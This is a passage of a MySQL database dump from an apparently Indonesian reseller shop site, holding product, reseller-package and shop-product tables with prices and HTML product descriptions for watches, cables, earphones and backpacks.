(24,27,NULL,'L',100,'2019-07-30 13:37:38','2019-07-30 13:37:38'),
(25,28,NULL,'L',100,'2019-07-30 13:39:57','2019-07-30 13:39:57'),
(26,29,NULL,'L',100,'2019-07-30 13:41:55','2019-07-30 13:41:55'),
(27,30,NULL,'L',100,'2019-07-30 13:44:47','2019-07-30 13:44:47'),
(28,31,NULL,'L',100,'2019-07-30 13:47:03','2019-07-30 13:47:03'),
(29,32,NULL,'L',100,'2019-07-30 14:21:03','2019-07-30 14:21:03'),
(30,33,NULL,'L',100,'2019-07-30 14:23:23','2019-07-30 14:23:23'),
(31,34,NULL,'L',100,'2019-07-30 14:25:28','2019-07-30 14:25:28'),
(32,35,NULL,'L',100,'2019-07-30 14:27:46','2019-07-30 14:27:46'),
(33,36,NULL,'L',100,'2019-07-30 14:30:53','2019-07-30 14:30:53'),
(34,37,NULL,'L',100,'2019-07-30 14:33:49','2019-07-30 14:33:49'),
(35,43,NULL,'L',100,'2019-07-30 14:38:58','2019-07-30 14:38:58'),
(36,44,NULL,'L',100,'2019-07-30 14:43:15','2019-07-30 14:43:15'),
(37,45,NULL,'L',100,'2019-07-30 15:06:20','2019-07-30 15:06:20'),
(38,46,NULL,'L',100,'2019-07-30 15:13:48','2019-07-30 15:13:48'),
(39,48,NULL,'L',100,'2019-07-30 15:19:21','2019-07-30 15:19:21'),
(40,49,NULL,'L',100,'2019-07-30 15:22:04','2019-07-30 15:22:04'),
(41,50,NULL,'L',100,'2019-07-30 15:27:52','2019-07-30 15:27:52'),
(42,51,NULL,'L',100,'2019-07-30 15:29:54','2019-07-30 15:29:54'),
(43,52,NULL,'L',100,'2019-07-30 15:33:02','2019-07-30 15:33:02'),
(44,37,'Merah','S',1,'2019-08-28 23:24:09','2019-08-28 23:24:09');

/*Table structure for table `products` */

DROP TABLE IF EXISTS `products`;

CREATE TABLE `products` (
  `id` bigint(20) unsigned NOT NULL AUTO_INCREMENT,
  `name` varchar(200) COLLATE utf8mb4_unicode_ci NOT NULL,
  `slug` varchar(220) COLLATE utf8mb4_unicode_ci DEFAULT NULL,
  `brand` varchar(220) COLLATE utf8mb4_unicode_ci DEFAULT NULL,
  `category_id` int(11) DEFAULT NULL,
  `agent_price` decimal(22,2) NOT NULL DEFAULT '0.00',
  `selling_price` decimal(22,2) NOT NULL DEFAULT '0.00',
  `profit` decimal(22,2) NOT NULL DEFAULT '0.00',
  `profit_limit` decimal(22,2) NOT NULL DEFAULT '0.00',
  `discount` decimal(22,2) NOT NULL DEFAULT '0.00',
  `weight` decimal(22,2) NOT NULL DEFAULT '0.00',
  `unit` varchar(7) COLLATE utf8mb4_unicode_ci DEFAULT NULL,
  `description` text COLLATE utf8mb4_unicode_ci,
  `main_image` varchar(255) COLLATE utf8mb4_unicode_ci DEFAULT NULL,
  `sku` varchar(255) COLLATE utf8mb4_unicode_ci DEFAULT NULL,
  `status` enum('active','inactive') COLLATE utf8mb4_unicode_ci NOT NULL DEFAULT 'active',
  `created_at` timestamp NULL DEFAULT NULL,
  `updated_at` timestamp NULL DEFAULT NULL,
  PRIMARY KEY (`id`)
) ENGINE=InnoDB AUTO_INCREMENT=53 DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_unicode_ci;

/*Data for the table `products` */

insert  into `products`(`id`,`name`,`slug`,`brand`,`category_id`,`agent_price`,`selling_price`,`profit`,`profit_limit`,`discount`,`weight`,`unit`,`description`,`main_image`,`sku`,`status`,`created_at`,`updated_at`) values 
(11,'Megir Roselo Original','megir-roselo-original','Megir',2,0.00,0.00,0.00,40000.00,0.00,200.00,'gram','<strong></strong><p>Tampil standout dengan Gamis terbaru dari Azeeza. Long dress berdesain modern dengan aplikasi ruffle yang memikat untuk anda Muslimah penuh semangat</p><p>Materials<br>Bubblepop</p><p>Fitur<br>•&nbsp;&nbsp; &nbsp;Dibuat dari material bubblepop, tebal namun terasa ringan saat dipakai. Anda akan merasa &nbsp; &nbsp;nyaman dan bebas bergerak saat memakainya.<br>•&nbsp;&nbsp; &nbsp;Terdapat zipper pada bagian depan yang busui friendly<br>•&nbsp;&nbsp; &nbsp;Terdapat karet pada bagian ujung lengan agar memudahkan anda saat berwudhu.<br>•&nbsp;&nbsp; &nbsp;Pada bagian dalam gamis dilapisi furing berbahan halus sehingga terasa adem dan nyaman saat dipakai seharian.<br>•&nbsp;&nbsp; &nbsp;Desain dengan rempel pada bagian depan hijab dan bagian bawah gamis membuat anda terlihat lebih menarik saat memakai gamis ini.<br>•&nbsp;&nbsp; &nbsp;Tersedia dalam bberbagai warna yang sedang trend yang dapat anda pilih.<br>•&nbsp;&nbsp; &nbsp;Ukuran all size, bisa dipakai oleh siapa saja.</p><p>##### Tinggi/Berat Badan Model<br>173cm/51kg</p><strong></strong>','products-1564459588.JPG','2118','active','2019-07-30 04:06:28','2019-08-27 17:30:58'),
(12,'Megir Madona Original','megir-madona-original','Megir',2,0.00,0.00,0.00,50000.00,0.00,200.00,'gram','<p><span data-cke-bookmark=\"1\" style=\"display: none;\">&nbsp;</span>UNTUK KAMU YANG BERJIWA BERANI DAN TANGGUH. Tampilkan sisi maskulinmu bersama Jaymodric leather jacket<br></p><p><br></p><p>##### Materials<br>High Quality PU Leather</p><p><br></p><p>##### Fitur<br>•&nbsp;&nbsp; &nbsp;Berbahan dasar PU leather kualitas tinggi yang tahan air dan tidak kaku sehingga nyaman dipakai bahkan seharian.<br>•&nbsp;&nbsp; &nbsp;Lebih nyaman lagi dengan furing dalam berbahan halus<br>•&nbsp;&nbsp; &nbsp;Inside pocket bisa untuk menyimpan gadget anda saat hujan agar tetap aman.<br>•&nbsp;&nbsp; &nbsp;Desain saku tambahan pada lengan menjadikan anda lebih bergaya saat memakainnya.<br>•&nbsp;&nbsp; &nbsp;Menggunakan zipper YKK original<br>•&nbsp;&nbsp; &nbsp;Tersedia dalam dua varian warna yang sedang trend, red dan brown.</p><p><br></p><p>##### Tinggi/Berat badan Talent<br>180cm/72kg<br>Talent menggunakan size XL<span data-cke-bookmark=\"1\" style=\"display: none;\">&nbsp;</span><br></p><p><br></p>','products-1564459883.JPG','3005','active','2019-07-30 04:11:23','2019-08-27 19:26:10'),
(13,'Megir Luxiro Original','megir-luxiro-original','Megir',2,0.00,0.00,0.00,50000.00,0.00,200.00,'gram','<p><br></p>','products-1564460027.jpg','2019','active','2019-07-30 04:13:47','2019-07-30 04:13:47'),
(14,'Megir  Axe Original','megir-axe-original','Megir',2,0.00,0.00,0.00,50000.00,0.00,200.00,'gram','<p><br></p>','products-1564460140.jpg','2050','active','2019-07-30 04:15:40','2019-07-30 04:15:40'),
(15,'Megir Aqua Original','megir-aqua-original','Megir',2,0.00,0.00,0.00,50000.00,0.00,200.00,'gram','<p><br></p>','products-1564469114.jpg','2018','active','2019-07-30 06:45:14','2019-07-30 06:45:14'),
(16,'Megir CHR Original','megir-chr-original','Megir',2,0.00,0.00,0.00,50000.00,0.00,200.00,'gram','<p><br></p>','products-1564469350.jpg','2010','active','2019-07-30 06:49:10','2019-07-30 06:49:10'),
(17,'Megir Maxim Original','megir-maxim-original','Megir',2,0.00,0.00,0.00,50000.00,0.00,200.00,'gram','<p><br></p>','products-1564469819.jpg','2030','active','2019-07-30 06:56:59','2019-07-30 06:56:59'),
(18,'Megir Lazy Original','megir-lazy-original','Megir',2,0.00,0.00,0.00,50000.00,0.00,200.00,'gram','<p><br></p>','products-1564470666.JPG','2063','active','2019-07-30 07:11:06','2019-07-30 07:11:06'),
(19,'Megir Bondi Original','megir-bondi-original','Megir',2,0.00,0.00,0.00,50000.00,0.00,200.00,'gram','<p><br></p>','products-1564471233.jpg','2002','active','2019-07-30 07:20:33','2019-07-30 07:20:33'),
(20,'Megir Herro Original','megir-herro-original','Megir',2,0.00,0.00,0.00,50000.00,0.00,200.00,'gram','<p><br></p>','products-1564472674.jpg','2078','active','2019-07-30 07:44:34','2019-07-30 07:44:34'),
(21,'Megir Kino Original','megir-kino-original','Megir',2,0.00,0.00,0.00,50000.00,0.00,200.00,'gram','<p><br></p>','products-1564472903.jpg','2052','active','2019-07-30 07:48:23','2019-07-30 07:48:23'),
(22,'Megir Mali Original','megir-mali-original','Megir',2,0.00,0.00,0.00,50000.00,0.00,200.00,'gram','<p><br></p>','products-1564474187.JPG','1019','active','2019-07-30 08:09:47','2019-07-30 08:09:47'),
(23,'Jam Anak Marvel CA','jam-anak-marvel-ca','Marvel',3,0.00,0.00,0.00,50000.00,0.00,200.00,'gram','<p><br></p>','products-1564474477.webp','81061','active','2019-07-30 08:14:37','2019-07-30 13:31:17'),
(24,'Jam Anak Herro CA','jam-anak-herro-ca','Marvel',3,0.00,0.00,0.00,50000.00,0.00,200.00,'gram','<p><br></p>','products-1564493376.jpg','81062','active','2019-07-30 13:29:36','2019-07-30 13:29:36'),
(25,'Jam Anak Edisi Captain America','jam-anak-edisi-captain-america','Marvel',3,0.00,0.00,0.00,50000.00,0.00,200.00,'gram','<p><br></p>','products-1564493580.jpg','81032','active','2019-07-30 13:33:00','2019-07-30 13:33:00'),
(26,'Jam Anak Edisi Super Herro','jam-anak-edisi-super-herro','Marvel',3,0.00,0.00,0.00,50000.00,0.00,200.00,'gram','<p><strong>​​​​​​​</strong><br></p>','products-1564493715.JPG','81044','active','2019-07-30 13:35:15','2019-07-30 13:35:15'),
(27,'Jam Anak Herro Red Edition','jam-anak-herro-red-edition','Marvel',3,0.00,0.00,0.00,50000.00,0.00,200.00,'gram','<p><br></p>','products-1564493858.jpg','81065','active','2019-07-30 13:37:38','2019-07-30 13:37:38'),
(28,'Jam Anak Avengers','jam-anak-avengers','Marvel',3,0.00,0.00,0.00,50000.00,0.00,200.00,'gram','<p><br></p>','products-1564493997.JPG','82018','active','2019-07-30 13:39:57','2019-07-30 13:39:57'),
(29,'Jam Anak Captain A','jam-anak-captain-a','Marvel',2,0.00,0.00,0.00,50000.00,0.00,200.00,'gram','<p><br></p>','products-1564494115.jpg','82008','active','2019-07-30 13:41:55','2019-07-30 13:41:55'),
(30,'Jam Anak Spiderman','jam-anak-spiderman','Marvel',3,0.00,0.00,0.00,50000.00,0.00,200.00,'gram','<p><br></p>','products-1564494287.jpg','81067','active','2019-07-30 13:44:47','2019-07-30 13:44:47'),
(31,'Jam Anak Spider Edition','jam-anak-spider-edition','Marvel',3,0.00,0.00,0.00,50000.00,0.00,200.00,'gram','<p><br></p>','products-1564494423.jpg','81048','active','2019-07-30 13:47:03','2019-07-30 13:47:03'),
(32,'Cable Data Remax Ori 3 in 1','cable-data-remax-ori-3-in-1','Remax',4,0.00,0.00,0.00,10000.00,0.00,200.00,'gram','<p><br></p>','products-1564496463.JPG','050th','active','2019-07-30 14:21:03','2019-07-30 14:21:03'),
(33,'Remax Cable For Iphone Ori','remax-cable-for-iphone-ori','Remax',4,0.00,0.00,0.00,10000.00,0.00,200.00,'gram','<p><br></p>','products-1564496603.jpg','044i','active','2019-07-30 14:23:23','2019-07-30 14:23:23'),
(34,'Remax Cable SUDA 3 in 1 Ori','remax-cable-suda-3-in-1-ori','Remax',4,0.00,0.00,0.00,10000.00,0.00,200.00,'gram','<p><br></p>','products-1564496728.jpg','109th','active','2019-07-30 14:25:28','2019-07-30 14:25:28'),
(35,'Remax Handsfree Sporty Bluetooth Ori','remax-handsfree-sporty-bluetooth-ori','Remax',4,0.00,0.00,0.00,40000.00,0.00,200.00,'gram','<p><br></p>','products-1564496866.JPG','rbs5','active','2019-07-30 14:27:46','2019-07-30 14:27:46'),
(36,'Remax H/F Bluetooth mini Ori','remax-hf-bluetooth-mini-ori','Remax',4,0.00,0.00,0.00,25000.00,0.00,200.00,'gram','<p><br></p>','products-1564497053.JPG','T22','active','2019-07-30 14:30:53','2019-07-30 14:30:53'),
(37,'Bluetooth Earphone Remax Ori','bluetooth-earphone-remax-ori','Remax',4,0.00,0.00,0.00,25000.00,0.00,200.00,'gram','<p>testt test test test<br></p>','products-1564497241.jpg','S19','active','2019-07-30 14:33:49','2019-08-15 12:23:54'),
(43,'Earphone Bluetooth Sports Edition Remax Ori','earphone-bluetooth-sports-edition-remax-ori','Remax',4,0.00,0.00,0.00,30000.00,0.00,200.00,'gram','<p><br></p>','products-1564497538.JPG','S20','active','2019-07-30 14:38:58','2019-07-30 14:38:58'),
(44,'Speaker Mini Bluetooth Remax Ori','speaker-mini-bluetooth-remax-ori','Remax',4,0.00,0.00,0.00,25000.00,0.00,200.00,'gram','<p><br></p>','products-1564497795.jpg','M13','active','2019-07-30 14:43:15','2019-07-30 14:43:15'),
(45,'EPOL Ranselia 9060','epol-ranselia-9060','EPOL',5,0.00,0.00,0.00,40000.00,0.00,1000.00,'gram','<p><br></p>','products-1564499180.jpg','9060','active','2019-07-30 15:06:20','2019-07-30 15:06:20'),
(46,'EPOL Luna 60066','epol-luna-60066','EPOL',5,0.00,0.00,0.00,30000.00,0.00,1000.00,'gram','<p><br></p>','products-1564499628.jpg','60066','active','2019-07-30 15:13:48','2019-07-30 15:13:48'),
(47,'EPOL Mila Ransel Cowok 2846','epol-mila-ransel-cowok-2846','EPOL',5,0.00,0.00,0.00,30000.00,0.00,1000.00,'gram','<p><br></p>','products-1564499762.jpg','2846','active','2019-07-30 15:16:02','2019-07-30 15:16:02'),
(48,'EPOL Angeline 600905','epol-angeline-600905','EPOL',5,0.00,0.00,0.00,25000.00,0.00,1000.00,'gram','<p><br></p>','products-1564499961.jpg','600905','active','2019-07-30 15:19:21','2019-07-30 15:19:21'),
(49,'EPOL Ransel Montana Sport 3916','epol-ransel-montana-sport-3916','EPOL',5,0.00,0.00,0.00,30000.00,0.00,1000.00,'gram','<p><br></p>','products-1564500124.jpg','3916','active','2019-07-30 15:22:04','2019-07-30 15:22:04'),
(50,'EPOL Backpack Vito 9254','epol-backpack-vito-9254','EPOL',5,0.00,0.00,0.00,25000.00,0.00,1000.00,'gram','<p><br></p>','products-1564500472.jpg','9254','active','2019-07-30 15:27:52','2019-07-30 15:27:52'),
(51,'EPOL Ransel Mini Montana Sport 3963','epol-ransel-mini-montana-sport-3963','EPOL',5,0.00,0.00,0.00,25000.00,0.00,1000.00,'gram','<p><br></p>','products-1564500594.jpg','3963','active','2019-07-30 15:29:54','2019-07-30 15:29:54'),
(52,'EPOL Becklam 7027','epol-becklam-7027','EPOL',5,0.00,0.00,0.00,25000.00,0.00,1000.00,'gram','<p><br></p>','products-1564500782.jpg','7027','active','2019-07-30 15:33:02','2019-07-30 15:33:02');

/*Table structure for table `reseller_dashboards` */

DROP TABLE IF EXISTS `reseller_dashboards`;

CREATE TABLE `reseller_dashboards` (
  `id` bigint(20) unsigned NOT NULL AUTO_INCREMENT,
  `information` text COLLATE utf8mb4_unicode_ci,
  `created_at` timestamp NULL DEFAULT NULL,
  `updated_at` timestamp NULL DEFAULT NULL,
  PRIMARY KEY (`id`)
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_unicode_ci;

/*Data for the table `reseller_dashboards` */

/*Table structure for table `reseller_packages` */

DROP TABLE IF EXISTS `reseller_packages`;

CREATE TABLE `reseller_packages` (
  `id` bigint(20) unsigned NOT NULL AUTO_INCREMENT,
  `title` varchar(255) COLLATE utf8mb4_unicode_ci DEFAULT NULL,
  `price` decimal(22,2) NOT NULL DEFAULT '0.00',
  `description_price` text COLLATE utf8mb4_unicode_ci,
  `maximum_product_sale` int(11) DEFAULT NULL,
  `minimum_price_sale` decimal(22,2) NOT NULL DEFAULT '0.00',
  `benefit` text COLLATE utf8mb4_unicode_ci,
  `other_rule` text COLLATE utf8mb4_unicode_ci,
  `created_at` timestamp NULL DEFAULT NULL,
  `updated_at` timestamp NULL DEFAULT NULL,
  PRIMARY KEY (`id`)
) ENGINE=InnoDB AUTO_INCREMENT=5 DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_unicode_ci;

/*Data for the table `reseller_packages` */

insert  into `reseller_packages`(`id`,`title`,`price`,`description_price`,`maximum_product_sale`,`minimum_price_sale`,`benefit`,`other_rule`,`created_at`,`updated_at`) values 
(3,'Paket Silver',1800000.00,'<p>paket silver</p>',25,10000.00,'<p>paket silver 2</p>',NULL,'2019-07-24 15:59:44','2019-07-24 15:59:44'),
(4,'Paket Gold',4100000.00,'<p>Paket Gold</p>',60,10000.00,'<p>Paket Gold</p>',NULL,'2019-07-24 16:00:40','2019-07-24 16:00:40');

/*Table structure for table `resellers` */

DROP TABLE IF EXISTS `resellers`;

CREATE TABLE `resellers` (
  `id` bigint(20) unsigned NOT NULL AUTO_INCREMENT,
  `created_at` timestamp NULL DEFAULT NULL,
  `updated_at` timestamp NULL DEFAULT NULL,
  PRIMARY KEY (`id`)
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_unicode_ci;

/*Data for the table `resellers` */

/*Table structure for table `roles` */

DROP TABLE IF EXISTS `roles`;

CREATE TABLE `roles` (
  `id` bigint(20) unsigned NOT NULL AUTO_INCREMENT,
  `name` varchar(255) COLLATE utf8mb4_unicode_ci DEFAULT NULL,
  `created_at` timestamp NULL DEFAULT NULL,
  `updated_at` timestamp NULL DEFAULT NULL,
  PRIMARY KEY (`id`)
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_unicode_ci;

/*Data for the table `roles` */

/*Table structure for table `shop_products` */

DROP TABLE IF EXISTS `shop_products`;

CREATE TABLE `shop_products` (
  `id` bigint(20) unsigned NOT NULL AUTO_INCREMENT,
  `user_id` bigint(20) DEFAULT NULL,
  `shop_id` bigint(20) DEFAULT NULL,
  `product_id` bigint(20) DEFAULT NULL,
  `agent_price` double DEFAULT NULL,
  `profit` double DEFAULT NULL,
  `created_at` timestamp NULL DEFAULT NULL,
  `updated_at` timestamp NULL DEFAULT NULL,
  `harga_coret` double DEFAULT NULL,
  `is_harga_coret` int(2) NOT NULL DEFAULT '0',
  `detail_product` text COLLATE utf8mb4_unicode_ci,
  `status` int(2) NOT NULL DEFAULT '1',
  `reset` int(2) NOT NULL DEFAULT '0',
  PRIMARY KEY (`id`)
) ENGINE=InnoDB AUTO_INCREMENT=588 DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_unicode_ci;

/*Data for the table `shop_products` */

insert  into `shop_products`(`id`,`user_id`,`shop_id`,`product_id`,`agent_price`,`profit`,`created_at`,`updated_at`,`harga_coret`,`is_harga_coret`,`detail_product`,`status`,`reset`) values 
(5,16,5,11,278000,40000,'2019-08-05 08:05:01','2019-08-05 08:05:01',NULL,0,NULL,1,0),
(6,16,5,12,180000,50000,'2019-08-05 08:05:05','2019-08-05 08:05:05',NULL,0,NULL,1,0),
(7,16,5,27,265000,50000,'2019-08-05 08:05:11','2019-08-05 08:05:11',NULL,0,NULL,1,0),
(8,16,5,13,192000,50000,'2019-08-05 08:05:16','2019-08-05 08:05:16',NULL,0,NULL,1,0),
(10,18,7,11,283000,40000,'2019-08-05 12:05:19','2019-08-05 12:05:19',NULL,0,NULL,1,0),
(11,18,7,12,900000,657000,'2019-08-05 12:05:33','2019-08-06 04:28:19',NULL,0,NULL,1,0),
(13,22,11,11,350000,107000,'2019-08-05 12:23:53','2019-08-19 03:46:54',NULL,0,NULL,1,0),
(14,22,11,47,350000,107000,'2019-08-05 12:25:50','2019-08-19 03:47:15',NULL,0,NULL,1,0),
(15,22,11,48,390000,208000,'2019-08-05 12:26:40','2019-08-19 03:47:39',NULL,0,NULL,1,0),
(16,39,25,23,255000,50000,'2019-08-05 12:51:17','2019-08-05 12:51:17',NULL,0,NULL,1,0),
(19,17,6,11,283000,40000,'2019-08-06 03:24:57','2019-08-06 03:24:57',NULL,0,NULL,1,0),
(20,19,8,11,280000,42000,'2019-08-06 03:25:47','2019-08-07 09:16:40',445000,0,'<!DOCTYPE html PUBLIC \"-//W3C//DTD HTML 4.0 Transitional//EN\" \"http://www.w3.org/TR/REC-html40/loose.dtd\">\n<html><body><p><span style=\"font-size:12pt\"><span style=\'font-family:\"Times New Roman\",serif\'>Arloji <b>#elegan</b> mengekspresikan kepribadian pria yang bercita rasa tinggi. <b>#LIMITEDEDITION #LIMITEDSTOCK #HARGATERBAIK</b> hanya di <span style=\"color:#0070c0\">shopme.id</span></span></span></p></body></html>\n',1,0),
(23,27,13,11,283000,40000,'2019-08-06 06:57:49','2019-08-06 06:57:49',NULL,0,NULL,1,0),
(24,27,13,12,185000,50000,'2019-08-06 06:58:10','2019-08-06 06:58:10',NULL,0,NULL,1,0),
(25,27,13,13,197000,50000,'2019-08-06 06:58:16','2019-08-06 06:58:16',NULL,0,NULL,1,0),
(26,27,13,14,313000,50000,'2019-08-06 06:58:39','2019-08-06 06:58:39',NULL,0,NULL,1,0),
(27,27,13,15,232000,50000,'2019-08-06 06:58:48','2019-08-06 06:58:48',NULL,0,NULL,1,0),
(28,27,13,16,205000,50000,'2019-08-06 06:58:58','2019-08-06 06:58:58',NULL,0,NULL,1,0),
(29,27,13,23,260000,50000,'2019-08-06 06:59:11','2019-08-06 06:59:11',NULL,0,NULL,1,0),
(30,27,13,24,270000,50000,'2019-08-06 06:59:18','2019-08-06 06:59:18',NULL,0,NULL,1,0),
(31,27,13,25,260000,50000,'2019-08-06 06:59:26','2019-08-06 06:59:26',NULL,0,NULL,1,0),
(32,27,13,27,270000,50000,'2019-08-06 06:59:35','2019-08-06 06:59:35',NULL,0,NULL,1,0),
(33,27,13,30,270000,50000,'2019-08-06 06:59:49','2019-08-06 06:59:49',NULL,0,NULL,1,0),
(34,27,13,31,260000,50000,'2019-08-06 07:00:03','2019-08-06 07:00:03',NULL,0,NULL,1,0),
(35,27,13,36,106000,25000,'2019-08-06 07:00:17','2019-08-06 07:00:17',NULL,0,NULL,1,0),
(36,27,13,44,165000,25000,'2019-08-06 07:00:30','2019-08-06 07:00:30',NULL,0,NULL,1,0),
(37,27,13,48,207000,25000,'2019-08-06 07:00:51','2019-08-06 07:00:51',NULL,0,NULL,1,0),
(38,27,13,32,51000,10000,'2019-08-06 07:01:01','2019-08-06 07:01:01',NULL,0,NULL,1,0),
(39,27,13,33,51000,10000,'2019-08-06 07:01:09','2019-08-06 07:01:09',NULL,0,NULL,1,0),
(40,27,13,34,51000,10000,'2019-08-06 07:01:19','2019-08-06 07:01:19',NULL,0,NULL,1,0),
(41,27,13,45,318000,40000,'2019-08-06 07:01:31','2019-08-06 07:01:31',NULL,0,NULL,1,0),
(42,27,13,46,320000,30000,'2019-08-06 07:01:45','2019-08-06 07:01:45',NULL,0,NULL,1,0),
(43,27,13,35,195000,40000,'2019-08-06 07:02:04','2019-08-06 07:02:04',NULL,0,NULL,1,0),
(44,27,13,37,140000,25000,'2019-08-06 07:02:14','2019-08-06 07:02:14',NULL,0,NULL,1,0),
(45,27,13,43,170000,30000,'2019-08-06 07:02:26','2019-08-06 07:02:26',NULL,0,NULL,1,0),
(46,27,13,50,280000,25000,'2019-08-06 07:03:37','2019-08-06 07:03:37',NULL,0,NULL,1,0),
(47,27,13,52,303000,25000,'2019-08-06 07:03:47','2019-08-06 07:03:47',NULL,0,NULL,1,0),
(48,27,13,17,252000,50000,'2019-08-06 07:04:04','2019-08-06 07:04:04',NULL,0,NULL,1,0),
(49,27,13,18,225000,50000,'2019-08-06 07:04:13','2019-08-06 07:04:13',NULL,0,NULL,1,0),
(50,27,13,22,155000,50000,'2019-08-06 07:04:21','2019-08-06 07:04:21',NULL,0,NULL,1,0),
(51,21,10,13,199000,52000,'2019-08-06 07:25:10','2019-08-06 07:25:10',NULL,0,NULL,1,0),
(52,21,10,14,319000,56000,'2019-08-06 07:26:24','2019-08-06 07:26:24',NULL,0,NULL,1,0),
(53,21,10,12,195000,60000,'2019-08-06 07:27:10','2019-08-06 07:27:10',NULL,0,NULL,1,0),
(54,21,10,17,259000,57000,'2019-08-06 07:27:36','2019-08-06 07:27:36',NULL,0,NULL,1,0),
(55,21,10,11,299000,56000,'2019-08-06 07:28:10','2019-08-06 07:28:10',NULL,0,NULL,1,0),
(56,21,10,16,209000,54000,'2019-08-06 07:28:27','2019-08-06 07:28:27',NULL,0,NULL,1,0),
(57,21,10,18,229000,54000,'2019-08-06 07:28:46','2019-08-06 07:28:46',NULL,0,NULL,1,0),
(58,21,10,22,159000,54000,'2019-08-06 07:29:25','2019-08-06 07:29:25',NULL,0,NULL,1,0),
(59,21,10,19,232000,50000,'2019-08-06 07:29:54','2019-08-06 07:29:54',NULL,0,NULL,1,0),
(60,21,10,21,279000,52000,'2019-08-06 07:30:15','2019-08-06 07:30:15',NULL,0,NULL,1,0),
(61,21,10,32,59000,18000,'2019-08-06 07:31:26','2019-08-06 07:31:26',NULL,0,NULL,1,0),
(62,21,10,33,59000,18000,'2019-08-06 07:31:42','2019-08-06 07:31:42',NULL,0,NULL,1,0),
(63,21,10,34,55000,14000,'2019-08-06 07:31:58','2019-08-06 07:31:58',NULL,0,NULL,1,0),
(64,21,10,43,179000,39000,'2019-08-06 07:32:16','2019-08-06 07:32:16',NULL,0,NULL,1,0),
(65,21,10,35,195000,40000,'2019-08-06 07:32:43','2019-08-06 07:32:43',NULL,0,NULL,1,0),
(66,21,10,37,145000,30000,'2019-08-06 07:32:58','2019-08-06 07:32:58',NULL,0,NULL,1,0),
(67,21,10,36,111000,30000,'2019-08-06 07:33:35','2019-08-06 07:33:35',NULL,0,NULL,1,0),
(68,21,10,44,175000,35000,'2019-08-06 07:33:57','2019-08-06 07:33:57',NULL,0,NULL,1,0),
(69,10,2,11,290000,47000,'2019-08-06 08:58:42','2019-08-28 10:50:52',500000,1,'<!DOCTYPE html PUBLIC \"-//W3C//DTD HTML 4.0 Transitional//EN\" \"http://www.w3.org/TR/REC-html40/loose.dtd\">\n<html><body><p>Tampil standout dengan Gamis terbaru dari Azeeza. Long dress berdesain modern dengan aplikasi ruffle yang memikat untuk anda Muslimah penuh semangat</p>\n\n<p>Materials<br>\nBubblepop</p>\n\n<p>Fitur<br>\n&bull;&nbsp;&nbsp; &nbsp;Dibuat dari material bubblepop, tebal namun terasa ringan saat dipakai. Anda akan merasa &nbsp; &nbsp;nyaman dan bebas bergerak saat memakainya.<br>\n&bull;&nbsp;&nbsp; &nbsp;Terdapat zipper pada bagian depan yang busui friendly<br>\n&bull;&nbsp;&nbsp; &nbsp;Terdapat karet pada bagian ujung lengan agar memudahkan anda saat berwudhu.<br>\n&bull;&nbsp;&nbsp; &nbsp;Pada bagian dalam gamis dilapisi furing berbahan halus sehingga terasa adem dan nyaman saat dipakai seharian.<br>\n&bull;&nbsp;&nbsp; &nbsp;Desain dengan rempel pada bagian depan hijab dan bagian bawah gamis membuat anda terlihat lebih menarik saat memakai gamis ini.<br>\n&bull;&nbsp;&nbsp; &nbsp;Tersedia dalam bberbagai warna yang sedang trend yang dapat anda pilih.<br>\n&bull;&nbsp;&nbsp; &nbsp;Ukuran all size, bisa dipakai oleh siapa saja.</p>\n\n<p>##### Tinggi/Berat Badan Model<br>\n173cm/51kg</p></body></html>\n',1,0),
(70,20,9,36,106000,25000,'2019-08-06 09:03:52','2019-08-06 09:03:52',NULL,0,NULL,1,0),
(71,20,9,44,165000,25000,'2019-08-06 09:04:21','2019-08-06 09:04:21',NULL,0,NULL,1,0),
(72,20,9,48,215000,33000,'2019-08-06 09:06:25','2019-08-06 09:06:25',NULL,0,NULL,1,0),
(73,20,9,34,55000,14000,'2019-08-06 09:07:11','2019-08-06 09:07:11',NULL,0,NULL,1,0),
(74,20,9,12,185000,50000,'2019-08-06 09:08:09','2019-08-06 09:08:09',NULL,0,NULL,1,0),
(75,20,9,11,285000,42000,'2019-08-06 09:08:59','2019-08-06 09:08:59',NULL,0,NULL,1,0),
(76,20,9,18,230000,55000,'2019-08-06 09:09:34','2019-08-06 09:09:34',NULL,0,NULL,1,0),
(77,20,9,21,277000,50000,'2019-08-06 09:10:01','2019-08-06 09:10:01',NULL,0,NULL,1,0),
(78,20,9,35,195000,40000,'2019-08-06 09:11:02','2019-08-06 09:11:02',NULL,0,NULL,1,0),
(79,20,9,45,320000,42000,'2019-08-06 09:11:48','2019-08-06 09:11:48',NULL,0,NULL,1,0),
(80,10,2,12,185000,50000,'2019-08-06 10:48:43','2019-08-27 19:39:26',195000,1,'<!DOCTYPE html PUBLIC \"-//W3C//DTD HTML 4.0 Transitional//EN\" \"http://www.w3.org/TR/REC-html40/loose.dtd\">\n<html><body><p><span style=\"display: none;\">&nbsp;</span>UNTUK KAMU YANG BERJIWA BERANI DAN TANGGUH. Tampilkan sisi maskulinmu bersama Jaymodric leather jacket</p>\n\n<p><u><strong>Materials</strong></u></p>\n\n<p>High Quality PU Leather</p>\n\n<p><strong>Fitur</strong><br>\n&bull;&nbsp;&nbsp; &nbsp;Berbahan dasar PU leather kualitas tinggi yang tahan air dan tidak kaku sehingga nyaman dipakai bahkan seharian.<br>\n&bull;&nbsp;&nbsp; &nbsp;Lebih nyaman lagi dengan furing dalam berbahan halus<br>\n&bull;&nbsp;&nbsp; &nbsp;Inside pocket bisa untuk menyimpan gadget anda saat hujan agar tetap aman.<br>\n&bull;&nbsp;&nbsp; &nbsp;Desain saku tambahan pada lengan menjadikan anda lebih bergaya saat memakainnya.<br>\n&bull;&nbsp;&nbsp; &nbsp;Menggunakan zipper YKK original<br>\n&bull;&nbsp;&nbsp; &nbsp;Tersedia dalam dua varian warna yang sedang trend, red dan brown.</p>\n\n<p><strong>Tinggi/Berat badan Talent</strong></p>\n\n<p><strong>180cm/72kg<br>\nTalent menggunakan size XL</strong><span style=\"display: none;\">&nbsp;</span></p>\n\n<p>&nbsp;</p></body></html>\n',0,0),
(81,10,2,13,197000,50000,'2019-08-06 10:49:01','2019-08-06 16:08:37',NULL,0,NULL,0,0),
